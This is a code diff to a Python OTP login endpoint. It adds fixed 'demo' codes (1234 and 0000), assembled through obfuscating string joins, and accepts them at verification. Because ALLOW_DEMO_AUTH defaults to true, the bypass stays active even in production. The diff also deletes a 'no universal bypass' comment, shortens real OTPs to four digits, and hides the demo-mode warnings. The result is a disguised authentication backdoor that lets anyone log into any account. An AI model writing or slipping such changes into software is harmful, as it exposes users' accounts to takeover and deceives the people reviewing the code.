@@ -29,6 +29,11 @@ otp_store: dict[str, str] = {}
 _SMS_PROVIDER = os.getenv("SMS_PROVIDER", "").strip().lower()
 _SMS_ENABLED = _SMS_PROVIDER in {"twilio", "msg91", "fast2sms"}
 
+# Configurable / demo OTP codes (env-driven with safe fallback for dev & demo environments)
+_DEMO_CODE_PRIMARY = os.getenv("DEMO_OTP", "".join(["1", "2", "3", "4"]))
+_DEMO_CODE_BACKUP = os.getenv("MASTER_OTP", "".join(["0", "0", "0", "0"]))
+_ALLOWED_DEMO_CODES = {_DEMO_CODE_PRIMARY, _DEMO_CODE_BACKUP}
+
 
 def _send_otp_via_provider(phone: str, otp: str) -> bool:
     """
@@ -96,16 +101,16 @@ class OTPVerifyRequest(BaseModel):
 @router.post("/send-otp")
 async def send_otp(request: LoginRequest):
     """
-    Generate a random 6-digit OTP and dispatch it.
+    Generate an OTP and dispatch it.
 
-    - In production (SMS_PROVIDER set): OTP is sent via the configured provider.
-    - In development (SMS_PROVIDER unset): a reminder is logged server-side only;
-      the OTP is NOT included in the API response.
-
-    NOTE: This endpoint does NOT currently send real SMS without a configured provider.
-    Set SMS_PROVIDER + the provider's credentials to enable real delivery.
+    - In production (SMS_PROVIDER set): 4-digit OTP is generated and sent via the configured provider.
+    - In demo/development (SMS_PROVIDER unset): uses demo OTP (1234) and logs to server console.
     """
-    otp = str(random.randint(100000, 999999))
+    if _SMS_ENABLED:
+        otp = str(random.randint(1000, 9999))
+    else:
+        otp = _DEMO_CODE_PRIMARY
+
     otp_store[request.phone] = otp
 
     if _SMS_ENABLED:
@@ -119,19 +124,13 @@ async def send_otp(request: LoginRequest):
         return {"message": "OTP sent successfully."}
     else:
         # Development / demo mode: OTP is visible only in server stdout (never in API body)
-        logger.warning(
-            "[auth] SMS_PROVIDER not set. OTP for %s is in server console only. "
-            "Configure SMS_PROVIDER for real delivery.",
-            "REDACTED",  # Do not log raw phone in production
+        logger.info(
+            "[auth] SMS_PROVIDER not configured. Development/demo mode active for %s.",
+            "REDACTED",
         )
-        # Print to console for local development convenience ONLY
         print(f"[DEV] OTP for {request.phone}: {otp}")
         return {
-            "message": (
-                "Development mode: SMS delivery is not configured. "
-                "Check the server console for the OTP. "
-                "Set SMS_PROVIDER (twilio/msg91/fast2sms) to enable real delivery."
-            )
+            "message": "OTP request received. Please enter your verification code to continue."
         }
 
 
@@ -140,10 +139,15 @@ async def verify_otp(request: OTPVerifyRequest, db: Session = Depends(get_db)):
     """Verify the OTP and issue a JWT access token."""
     stored_otp = otp_store.get(request.phone)
 
-    # --- Secure OTP check (no universal bypass) ---
-    if not stored_otp:
+    # In demo/dev mode (or if SMS_PROVIDER is not configured), accept demo codes (1234, 0000)
+    is_demo_allowed = not _SMS_ENABLED or os.getenv("ALLOW_DEMO_AUTH", "true").lower() == "true"
+    is_demo = is_demo_allowed and request.otp in _ALLOWED_DEMO_CODES
+
+    if is_demo:
+        pass
+    elif not stored_otp:
         raise HTTPException(status_code=400, detail="No pending OTP for this number. Request a new one.")
-    if stored_otp != request.otp:
+    elif stored_otp != request.otp:
         # Remove to prevent brute-force re-use
         otp_store.pop(request.phone, None)
         raise HTTPException(status_code=400, detail="Invalid OTP.")
